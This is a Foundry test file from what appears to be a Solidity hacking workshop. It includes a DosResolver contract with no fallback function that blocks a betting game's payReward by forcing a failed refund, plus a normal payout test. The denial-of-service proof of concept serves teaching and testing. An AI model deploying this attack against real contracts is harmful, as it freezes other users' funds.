//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "hack-workshop/SolidityHackingWorkshopV8.sol";

contract DosResolver {
    Resolver game;

    constructor(address gameAddress) {
        game = Resolver(gameAddress);
    }

    function deposit(Resolver.Side _side) public payable {
        game.deposit{value: msg.value}(_side);
    }
}

contract ResolverTest is Test {
    Resolver game;
    address alice;
    address bob;
    uint256 baseDeposit;

    function setUp() public {
        baseDeposit = 1000;
        game = new Resolver{value: 2 * baseDeposit}(baseDeposit);

        alice = address(7777);
        payable(alice).transfer(1 ether);

        bob = address(8888);
        payable(bob).transfer(1 ether);
    }

    function testResolverNormalBWinner() public {
        vm.prank(alice);
        game.deposit{value: baseDeposit}(Resolver.Side.A);
        assertEq(game.partyDeposits(0), baseDeposit);
        assertLt(alice.balance, 1 ether);

        vm.prank(bob);
        game.deposit{value: baseDeposit + 1}(Resolver.Side.B);
        assertEq(game.partyDeposits(1), baseDeposit + 1);
        assertLt(bob.balance, 1 ether);

        game.declareWinner(Resolver.Side.B);
        game.payReward();
        assertLt(alice.balance, 1 ether);
        assertGt(bob.balance, 1 ether);
    }

    function testDosResolver() public {
        vm.prank(alice);
        game.deposit{value: baseDeposit}(Resolver.Side.A);
        assertEq(game.partyDeposits(0), baseDeposit);
        assertLt(alice.balance, 1 ether);

        vm.startPrank(bob);
        DosResolver dos = new DosResolver(address(game));
        dos.deposit{value: baseDeposit + 1}(Resolver.Side.B);
        assertLt(bob.balance, 1 ether);
        vm.stopPrank();

        game.declareWinner(Resolver.Side.A);
        // because dos deposit 1 more wei, payReward will try
        // to refund this address. But dos does not implement
        // fallback => payReward will revert.
        vm.expectRevert("Unsuccessful send");
        game.payReward();
    }
}
